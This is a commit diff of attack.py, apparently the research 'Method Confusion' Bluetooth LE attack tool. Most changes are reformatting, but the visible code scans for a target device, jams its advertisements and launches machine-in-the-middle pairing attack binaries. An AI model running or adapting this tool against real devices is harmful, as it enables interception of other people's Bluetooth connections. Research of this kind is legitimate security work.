32f0f5a3194e1e8fd4382cec7e060879097a59fe
Kristina Magnussen <kristina.magnussen@tum.de>
2020-11-10 10:33:39 +0100

    send_test python script to test new methods

--- attack.py
+++ attack.py
@@ -4,6 +4,22 @@
 
 #from __future__ import print_function, unicode_literals
 
+from examples import custom_style_2
+from PyInquirer import style_from_dict, Token, prompt, Separator
+from pprint import pprint
+import argparse
+from btlejack.link import DeviceError
+from btlejack.helpers import *
+from btlejack.ui import CLIAdvertisementsSniffer, CLIAdvertisementsJammer, ForcedTermination
+from binascii import hexlify, unhexlify
+import signal
+import re
+import time
+import threading
+import select
+import subprocess
+import os
+import sys
 BTLEJACK_SOURCE_PATH = "btlejack/"
 DISCOVERY_BINARY = "discovery/discovery"
 NOP_BINARY_PATH = "NoP/nop.bin"
@@ -13,27 +29,11 @@ SCAN_TIMEOUT_SECONDS = 7
 SLEEP_TIME_BETWEEN_PACKET_PROCESSING = 0.01
 PATTERN_POSITION_MAC = 2
 
-import sys
-import os
-import subprocess
-import select
-import threading
-import time
-import re
-import signal
-from binascii import hexlify, unhexlify
 
 sys.path.insert(1, BTLEJACK_SOURCE_PATH)
 
-from btlejack.ui import CLIAdvertisementsSniffer, CLIAdvertisementsJammer, ForcedTermination
-from btlejack.helpers import *
-from btlejack.link import DeviceError
 
 # Dialog menu imports
-import argparse
-from pprint import pprint
-from PyInquirer import style_from_dict, Token, prompt, Separator
-from examples import custom_style_2
 
 
 # Dialogues
@@ -75,10 +75,10 @@ question_attack_variant = [
         'name': 'var',
         'message': 'Which attack variant shall be performed?',
         'choices': [
-        'auto',
-        'None',
-        'PoN',
-        'NoP'
+            'auto',
+            'None',
+            'PoN',
+            'NoP'
         ]
     }]
 
@@ -92,11 +92,14 @@ sniffer_mutex = threading.Lock()
 pattern_position = None
 
 # Helper functions
+
+
 def is_valid_mac(arg_value, pat=re.compile(r"[0-9a-f]{2}:([0-9a-f]{2}:){4}[0-9a-f]{2}$")):
     """ Checks if arg_value is a valid MAC e.g Aa:12:aa:bb:aa:ff and returns lowercased string """
     if not pat.match(arg_value.lower()):
         raise argparse.ArgumentTypeError
     return arg_value.lower()
+
 
 def is_attack_type(arg_value):
     """ Checks if arg_value is either string 'pon' or 'nop' (casinsensitive) and returns True for NoP, None for no attack"""
@@ -105,6 +108,7 @@ def is_attack_type(arg_value):
         raise argparse.ArgumentTypeError
     return arg_value
 
+
 def remove_by_pattern(l, pattern):
     """ Removes first element in string-list which matches pattern """
     for e, s in enumerate(l):
@@ -112,7 +116,7 @@ def remove_by_pattern(l, pattern):
             del l[e]
             return
 
-#def signal_handler(sig, frame):
+# def signal_handler(sig, frame):
 #    print('Received SIGINT -> Shutting down gracefuly!')
 #    if(jammer is not None):
 #        print("\tDisabling jamming")
@@ -131,6 +135,7 @@ def remove_by_pattern(l, pattern):
 #    print("Bye")
 #    os._exit(0)
 
+
 class PatternMatcher:
     def __init__(self, pattern=None):
         self.pattern = pattern
@@ -146,8 +151,10 @@ class PatternMatcher:
             pattern_position = pos - 10
             sniffing = False
             print(packet)
-            current_target_addr = ':'.join(["%02x" % i for i in reversed(packet[12:18])])
+            current_target_addr = ':'.join(
+                ["%02x" % i for i in reversed(packet[12:18])])
             print(current_target_addr)
+
 
 def main():
     """ Main routine """
@@ -157,22 +164,32 @@ def main():
     global current_target_addr
     global pattern_postition
 
-    parser = argparse.ArgumentParser(description='Method Confusion BLE attack tool.')
-    parser.add_argument('-i', '--initiator', dest='init_dev_num', type=int, default=None, help='lsusb number of MitM initiator device')
-    parser.add_argument('-r', '--responder', dest='resp_dev_num', type=int, default=None, help='lsusb number of MitM responder device')
-    parser.add_argument('-m', '--target-mac', dest='target_mac', type=is_valid_mac, default=None, help='MAC address of the target (if no target mac and no target pattern is provided BLE scanning will be initiated)')
-    parser.add_argument('-p', '--target-pattern', dest='target_pattern', type=str, default=None, help='Target\'s pattern in advertisement packet to scan for (if no target mac and no target pattern is provided BLE scanning will be initiated)')
-    parser.add_argument('-o', '--pattern-offset', dest='pattern_position', type=int, default=None, help='Target\'s pattern position in advertisement packet')
-    parser.add_argument('-a', '--attack-variant', dest='attack_variant', type=is_attack_type, default=None, help='Variant of attack (\'auto\', \'PoN\' or \'NoP\', \'None\' - just jamming\')')
-    parser.add_argument('-n', '--display-name', dest='overshadow_name', type=str, default=None, help='The name the MitM advertises itself (if not provided, the target name is used)')
-    parser.add_argument('-x', '--optimized', dest='optimized_jamming', type=bool, default=False, help='Use address as target for jamming (WARNING: If victim responder has *LE PRIVACY* enabled, this *prevents* following the address change)')
+    parser = argparse.ArgumentParser(
+        description='Method Confusion BLE attack tool.')
+    parser.add_argument('-i', '--initiator', dest='init_dev_num', type=int,
+                        default=None, help='lsusb number of MitM initiator device')
+    parser.add_argument('-r', '--responder', dest='resp_dev_num', type=int,
+                        default=None, help='lsusb number of MitM responder device')
+    parser.add_argument('-m', '--target-mac', dest='target_mac', type=is_valid_mac, default=None,
+                        help='MAC address of the target (if no target mac and no target pattern is provided BLE scanning will be initiated)')
+    parser.add_argument('-p', '--target-pattern', dest='target_pattern', type=str, default=None,
+                        help='Target\'s pattern in advertisement packet to scan for (if no target mac and no target pattern is provided BLE scanning will be initiated)')
+    parser.add_argument('-o', '--pattern-offset', dest='pattern_position', type=int,
+                        default=None, help='Target\'s pattern position in advertisement packet')
+    parser.add_argument('-a', '--attack-variant', dest='attack_variant', type=is_attack_type, default=None,
+                        help='Variant of attack (\'auto\', \'PoN\' or \'NoP\', \'None\' - just jamming\')')
+    parser.add_argument('-n', '--display-name', dest='overshadow_name', type=str, default=None,
+                        help='The name the MitM advertises itself (if not provided, the target name is used)')
+    parser.add_argument('-x', '--optimized', dest='optimized_jamming', type=bool, default=False,
+                        help='Use address as target for jamming (WARNING: If victim responder has *LE PRIVACY* enabled, this *prevents* following the address change)')
 
     args = parser.parse_args()
     #signal.signal(signal.SIGINT, signal_handler)
     #signal.signal(signal.SIGTERM, signal_handler)
 
     if(args.init_dev_num is None or args.resp_dev_num is None):
-        process = subprocess.Popen(['lsusb'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        process = subprocess.Popen(
+            ['lsusb'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         stdout, _ = process.communicate()
         usb_devices = stdout.decode().split("\n")
 
@@ -191,20 +208,24 @@ def main():
         remove_by_pattern(usb_devices, choice)
 
     if(args.attack_variant is None):
-        args.attack_variant = prompt(question_attack_variant, style=custom_style_2)['var'].lower()
+        args.attack_variant = prompt(question_attack_variant, style=custom_style_2)[
+            'var'].lower()
 
     if(args.target_pattern is not None):
         args.target_pattern = args.target_pattern.encode()
 
     if(args.target_mac is not None):
-        args.target_pattern = bytes.fromhex(args.target_mac.replace(":","")[::-1])
+        args.target_pattern = bytes.fromhex(
+            args.target_mac.replace(":", "")[::-1])
         args.pattern_position = PATTERN_POSITION_MAC
         current_target_addr = args.target_mac
 
     if(args.target_pattern is None):
-        args.target_pattern, target_name = search_target(args.init_dev_num, args.target_pattern)
+        args.target_pattern, target_name = search_target(
+            args.init_dev_num, args.target_pattern)
         current_target_addr = args.target_pattern
-        args.target_pattern = bytes.fromhex(args.target_pattern.replace(":","")[::-1])
+        args.target_pattern = bytes.fromhex(
+            args.target_pattern.replace(":", "")[::-1])
         args.pattern_position = PATTERN_POSITION_MAC
         if(args.overshadow_name is None):
             args.overshadow_name = target_name
@@ -213,9 +234,11 @@ def main():
         out = PatternMatcher(pattern=args.target_pattern)
         # start sniffer for pattern detection
         try:
-            sniffer = CLIAdvertisementsSniffer(verbose=True, output=out, no_stdout=True)
+            sniffer = CLIAdvertisementsSniffer(
+                verbose=True, output=out, no_stdout=True)
         except DeviceError as error:
-            print('Error: Please connect a compatible Micro:Bit in order to use BtleJack for jamming')
+            print(
+                'Error: Please connect a compatible Micro:Bit in order to use BtleJack for jamming')
             exit(-1)
         sniffing_packet_processing()
         args.pattern_position = pattern_position
@@ -225,16 +248,17 @@ def main():
         args.target_pattern = bytes.fromhex(current_target_addr)
 
     if(args.overshadow_name is None):
-        #TODO change position in adv packet
+        # TODO change position in adv packet
         args.overshadow_name = b" " + args.target_pattern
 
     print(f"Jamming all advertisements of {current_target_addr}")
-    #time.sleep(1)
+    # time.sleep(1)
 
     # Start jammer
     try:
         print(f"jamming {args.target_pattern} at {args.pattern_position}")
-        jammer = CLIAdvertisementsJammer(verbose=False, pattern=args.target_pattern, position=args.pattern_position)
+        jammer = CLIAdvertisementsJammer(
+            verbose=False, pattern=args.target_pattern, position=args.pattern_position)
     except DeviceError as error:
         print('Error: Please connect a compatible Micro:Bit in order to use BtleJack for jamming')
         exit(-1)
@@ -247,11 +271,14 @@ def main():
         while(True):
             time.sleep(1)
     elif args.attack_variant == 'auto':
-        attack_process = subprocess.Popen([AUTO_BINARY_PATH, str(args.init_dev_num), str(args.resp_dev_num), args.overshadow_name, current_target_addr], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
+        attack_process = subprocess.Popen([AUTO_BINARY_PATH, str(args.init_dev_num), str(
+            args.resp_dev_num), args.overshadow_name, current_target_addr], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
     elif args.attack_variant == 'nop':
-        attack_process = subprocess.Popen([NOP_BINARY_PATH, str(args.init_dev_num), str(args.resp_dev_num), args.overshadow_name, current_target_addr], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
+        attack_process = subprocess.Popen([NOP_BINARY_PATH, str(args.init_dev_num), str(
+            args.resp_dev_num), args.overshadow_name, current_target_addr], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
     elif args.attack_variant == 'pon':
-        attack_process = subprocess.Popen([PON_BINARY_PATH, str(args.init_dev_num), str(args.resp_dev_num), args.overshadow_name, current_target_addr], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
+        attack_process = subprocess.Popen([PON_BINARY_PATH, str(args.init_dev_num), str(
+            args.resp_dev_num), args.overshadow_name, current_target_addr], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
     else:
         print("invalid attack_variant \"" + args.attack_variant + "\"")
 
@@ -268,6 +295,7 @@ def main():
             jammer.disable_adv_jamming()
             jammer_mutex.release()
 
+
 def sniffing_packet_processing():
 
     global sniffing
@@ -280,6 +308,7 @@ def sniffing_packet_processing():
         time.sleep(SLEEP_TIME_BETWEEN_PACKET_PROCESSING)
 
     sniffer.disable_adv_sniffing()
+
 
 def jamming_packet_processing():
 
@@ -300,7 +329,8 @@ def search_target(scan_dev_num, target_pattern):
         begin_line_counter = 0
         target_options = {}
         # Start BLE scan
-        process = subprocess.Popen([DISCOVERY_BINARY, str(scan_dev_num)], stdout=subprocess.PIPE)
+        process = subprocess.Popen(
+            [DISCOVERY_BINARY, str(scan_dev_num)], stdout=subprocess.PIPE)
         poll_obj = select.poll()
         poll_obj.register(process.stdout, select.POLLIN)
         timeout = time.time() + SCAN_TIMEOUT_SECONDS
@@ -342,12 +372,12 @@ def search_target(scan_dev_num, target_pattern):
                     continue
                 target_options[result[0]] = result[2]
 
-
         if(target_options is not None):
             print("Could not identify target -> prompting alternatives")
 
         # Draw menu
-        question_target[0]['choices'].extend(str(target_options)[1:-1].split(','))
+        question_target[0]['choices'].extend(
+            str(target_options)[1:-1].split(','))
         question_target[0]['choices'].append('New scan')
         choice = prompt(question_target, style=custom_style_2)['target']
         if("New scan" in choice):
@@ -359,6 +389,7 @@ def search_target(scan_dev_num, target_pattern):
         choice = [choice[0][1:-1], choice[1][1:-1]]
         print(choice)
         return choice
+
 
 if __name__ == "__main__":
     main()
